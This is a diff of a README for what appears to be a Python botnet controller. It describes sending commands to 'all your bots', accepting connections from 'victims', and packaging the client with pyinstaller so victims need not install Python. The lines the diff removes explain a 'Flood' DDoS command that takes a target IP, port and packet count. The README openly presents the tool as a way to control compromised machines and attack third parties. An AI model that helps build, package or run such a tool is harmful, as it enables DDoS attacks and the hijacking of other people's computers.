@@ -10,8 +10,6 @@ Here is the list of things you can do :
 - Help : Display a help screen
 - Cmd  : Send command to all your bots
 - Refresh : When there are new vitcims, hit refresh to accept the connection
-- Flood : Execute a DDoS attack against a victim. Once you hit that command and hit enter, you must specify the target ip, the target port and the number of packets you want to send (2500 packets = 10sec), all separated by ":". For example : 1.1.1.1:80:2500. And bam! All your bots will send packets to the victim. More you have bots, more powerful it is.
-- How to cook an egg : Teach you how to cook an egg
 - Close : Close all connections with your bots.
 
 Feel free to change the script as you want and add more feature.
@@ -21,7 +19,7 @@ Feel free to change the script as you want and add more feature.
 You can also use pyinstaller to make an executable of the client so the victim won't need to download python and dependencies.You can also change the port if you want but you will need to change the port also in the server script.
 
 
-List of dependencies you will need :
+List of dependencies you will need run client:
 
 - pip install sockets
 - pip install scapy
